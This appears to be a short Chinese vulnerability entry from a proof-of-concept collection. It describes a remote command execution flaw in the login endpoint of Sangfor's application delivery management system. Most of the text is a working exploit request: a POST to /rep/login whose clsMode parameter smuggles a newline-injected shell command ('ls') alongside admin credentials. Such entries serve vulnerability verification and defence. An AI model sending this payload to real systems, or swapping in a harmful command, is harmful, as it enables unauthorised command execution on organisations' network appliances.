#### 影响范围
深信服应用交付管理系统

#### 漏洞概述
深信服应用交付管理系统login远程命令执行

#### 漏洞复现
验证POC：
````
POST /rep/login 
clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```
